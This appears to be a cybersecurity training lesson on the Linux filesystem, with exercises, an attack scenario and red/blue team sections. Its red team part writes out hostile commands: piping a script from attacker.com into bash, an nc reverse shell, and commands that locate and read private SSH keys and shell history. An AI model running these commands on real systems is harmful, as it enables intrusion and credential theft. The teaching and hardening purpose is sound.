1. Theory Section
Core concepts · FHS · Security relevance

The Filesystem Hierarchy Standard (FHS)

Linux follows the FHS — a standard that defines where every file and directory should live. Unlike Windows, everything in Linux starts from a single root: /. There are no drive letters (C:, D:). Everything hangs off that one root.

/ ├── bin/ core user binaries ├── sbin/ system admin binaries ├── etc/ configuration files ├── home/ user home directories ├── root/ root user's home ├── var/ variable data (logs, mail, spool) ├── tmp/ temporary files (world-writable) ├── dev/ device files ├── proc/ virtual FS — kernel/process info ├── sys/ virtual FS — kernel/hardware info ├── lib/ shared libraries ├── usr/ user programs and data ├── opt/ optional/third-party software ├── boot/ bootloader, kernel image └── mnt/ media/ mount points

Critical directories — what they mean for security

/etc
high value target
All system configuration. Contains /etc/passwd, /etc/shadow, /etc/sudoers, SSH config, cron jobs. Attacker's goldmine.
/var/log
defender's friend
All system logs live here — auth.log, syslog, kern.log. First place defenders check after an incident.
/tmp
attacker favorite
World-writable, often no-execute restrictions. Attackers drop malware, compile exploits, stage payloads here. Gets wiped on reboot.
/home /root
credential target
User data, SSH keys (.ssh/), shell history (.bash_history), browser data. Attackers look here after initial access.
/proc
recon goldmine
Virtual filesystem. Exposes running processes, memory maps, network connections. /proc/net/tcp shows all open sockets.
/bin /sbin /usr/bin
living off the land
Legitimate system binaries. Attackers use built-in tools (curl, nc, python3) to avoid bringing malware. Called "LOLBins".
/dev
device access
Device files. /dev/null (discard), /dev/random (randomness), /dev/sda (disk). Direct disk access bypasses filesystem permissions.
/opt
persistence location
Third-party software. Attackers may install backdoors here since it's less monitored than system dirs.

Key concept: everything is a file

In Linux, devices, processes, network sockets, and hardware are all represented as files. This means the same file reading/writing tools work on everything — and understanding the filesystem means understanding the whole OS.

2. Practical Section
Hands-on commands · Step-by-step exercises

Exercise 1 — explore the root structure

ls / # see top-level directories ls -la / # with hidden files + permissions ls /etc | head -30 # first 30 items in /etc ls /var/log # all log files du -sh /* 2>/dev/null # size of each top-level dir

Exercise 2 — investigate /etc (attacker's goldmine)

cat /etc/passwd # user accounts (no passwords) cat /etc/group # group memberships cat /etc/hostname # machine name cat /etc/hosts # local DNS overrides cat /etc/crontab # scheduled tasks (system-wide) ls /etc/cron.d/ # per-app cron jobs cat /etc/ssh/sshd_config # SSH server config

Exercise 3 — read logs like a defender

ls -lh /var/log # log files with sizes tail -20 /var/log/syslog # last 20 lines of syslog tail -20 /var/log/auth.log # last 20 auth events grep "Failed" /var/log/auth.log # failed logins grep "Accepted" /var/log/auth.log # successful logins

Exercise 4 — explore /proc (live kernel data)

cat /proc/version # kernel version cat /proc/cpuinfo # CPU info cat /proc/meminfo # memory details cat /proc/net/tcp # raw open TCP connections ls /proc/$$ # current shell's process directory

Exercise 5 — check /tmp and writable locations

ls -la /tmp # what's in tmp right now ls -la /dev/shm # shared memory (also writable) find / -writable -type d 2>/dev/null | head -20 # all writable dirs find /tmp -type f 2>/dev/null # files in tmp

Exercise 6 — find sensitive files (as an attacker would)

find / -name "*.conf" 2>/dev/null | head -20 find / -name "id_rsa" 2>/dev/null # private SSH keys find / -name ".bash_history" 2>/dev/null find / -name "*.log" 2>/dev/null | head -20 find /home -name "*.txt" 2>/dev/null
3. Real-World Scenario
Attack & defense story based on today's topic

A developer accidentally exposes a web shell on a corporate Linux server running Apache. An attacker finds it and gets basic command execution as the www-data user.

Step 1 — initial access via web shell

The attacker runs id and sees www-data. Low privilege, but they're inside the filesystem now.

Step 2 — filesystem recon

They run cat /etc/passwd to list all users, check /home for user directories, and read /var/www/html for any hardcoded database credentials in config files.

Step 3 — credential discovery

Inside /var/www/html/config.php they find a MySQL password in plaintext. They also find /home/developer/.bash_history showing the developer ran sudo su recently — meaning the account has sudo access.

Step 4 — persistence via /tmp

They write a reverse shell script to /tmp/.hidden_shell.sh (hidden via dot prefix) and add a cron entry via /etc/cron.d/ to run it every 5 minutes.

What should have happened

No plaintext credentials in web root. /tmp mounted with noexec flag preventing script execution. .bash_history permissions restricted. Regular log review of /var/log/auth.log and cron logs would have caught the persistence.

4. Red Team Perspective
How attackers use the filesystem

Post-exploitation filesystem checklist

After gaining initial access, a red teamer performs structured filesystem enumeration. This is called "local enumeration" and it follows a set order:

  • /etc/passwd — list all users, spot service accounts
  • /etc/shadow — password hashes (root-only, but worth trying)
  • /etc/sudoers — who can run what as root
  • /home/*/ — SSH keys, credentials, notes, scripts
  • /var/www/ — web app source code with hardcoded creds
  • /opt/ and /srv/ — custom installed apps, often misconfigured
  • /tmp/ and /dev/shm/ — safe writable staging areas
  • /proc/net/ — live network state without needing netstat

Living off the land (LOLBins)

Attackers avoid uploading tools. Instead they use what's already in /bin, /usr/bin, /usr/sbin. Examples:

python3 -c "import pty;pty.spawn('/bin/bash')" # upgrade shell curl http://attacker.com/payload | bash # download & run nc -e /bin/bash attacker.com 4444 # reverse shell find / -perm -4000 2>/dev/null # find SUID binaries

Sensitive file targeting

cat /etc/crontab # scheduled tasks = persistence opportunity cat ~/.ssh/id_rsa # steal private key = password-less login cat /root/.bash_history # see what root has been doing find / -name "*.db" 2>/dev/null # SQLite databases with data
5. Blue Team Perspective
Monitor · Harden · Detect filesystem threats

File integrity monitoring (FIM)

Defenders monitor critical directories for any unauthorized changes. Tools like auditd, AIDE, and Tripwire alert when files in /etc, /bin, /sbin change unexpectedly.

apt install aide # install AIDE aide --init # create baseline database aide --check # compare current state vs baseline

Harden /tmp and /dev/shm

Add noexec, nosuid, nodev flags to /tmp in /etc/fstab to prevent attackers from executing files staged there:

tmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0

Log monitoring — what to watch

tail -f /var/log/auth.log # live auth events grep "CRON" /var/log/syslog # cron job execution grep "useradd\|usermod" /var/log/auth.log # new users created find /tmp /dev/shm -type f -newer /tmp # new files in tmp ls -lat /etc/cron.d/ # recently modified cron jobs

Protect sensitive files

  • Ensure /etc/shadow is owned by root, mode 640
  • Ensure /etc/sudoers is only editable via visudo
  • Remove world-readable permissions from config files with credentials
  • Use chattr +i /etc/passwd to make critical files immutable
ls -la /etc/shadow # verify permissions stat /etc/passwd # detailed file metadata chattr +i /etc/hosts # make immutable (even root can't edit)

10. Pro Tips & Mindset
Advice · Mistakes to avoid · How pros think

When you land on any new Linux system — whether as a pentester or a sysadmin — the first thing you do is orient yourself. uname -a, cat /etc/os-release, ls /, df -h. Know your environment before doing anything else.

The dot prefix hides files — .bash_history, .ssh/, .config/. Always use ls -la, never just ls. Hidden files are where secrets live.

Symlinks (ln -s) can point across filesystem boundaries. A /tmp/link pointing to /etc/shadow is a classic privilege escalation vector. Always check what symlinks resolve to.

Common mistake: running find / without 2>/dev/null. You'll get thousands of "Permission denied" errors drowning real results. Always redirect stderr.

Common mistake: thinking /etc/passwd contains passwords. It doesn't — those moved to /etc/shadow decades ago. /etc/passwd is world-readable and safe to view. Understanding this is fundamental.

Pro mindset: treat the filesystem as an evidence trail. Every file has timestamps — atime (accessed), mtime (modified), ctime (changed). Forensics is about reading that trail. Run stat filename to see all three.
